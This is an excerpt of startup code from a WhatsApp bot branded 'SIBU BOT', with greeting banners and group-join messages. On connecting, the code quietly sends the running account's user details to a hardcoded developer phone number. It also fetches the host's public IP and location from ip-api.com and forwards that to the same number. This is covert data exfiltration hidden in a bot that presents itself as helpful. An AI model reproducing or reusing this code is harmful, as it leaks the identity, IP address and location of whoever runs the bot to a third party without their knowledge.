...
console.log(color(figlet.textSync(`${spc1}            𝗦𝗜𝗕𝗨 𝗕𝗢𝗧`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('[𝗦𝗜𝗕𝗨 𝗕𝗢𝗧]'), color('𝐒𝐢𝐛𝐮 𝐁𝐨𝐭 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.sendMessage(`919337956084@s.whatsapp.net`, `*Hi Owner 𝐒𝐈𝐁𝐔, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 𝐒𝐈𝐁𝐔 Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./𝐒𝐈𝐁𝐔.jpg'),sourceUrl:"https://wa.me/919337956084?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("919337956084@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 𝐒𝐈𝐁𝐔 Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./𝐒𝐈𝐁𝐔.jpg'),sourceUrl:"https://wa.me/919337956084?text=Hello bro"}}})
...
fkontakk = { key: {
 ...
 message: {
    "contactMessage":{"displayName":'𝐒𝐈𝐁𝐔',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;𝐒𝐈𝐁𝐔;;;\nFN:resku\nitem1.TEL;waid=919337956084:+91 933-7956-084\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
  ...
  client.on("group-participants-update", async (anu) => {
    try {
      ...
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "Hello everyone, am 𝗦𝗜𝗕𝗨 𝗕𝗢𝗧, ready to help you here ㋛︎", "conversation");
      }
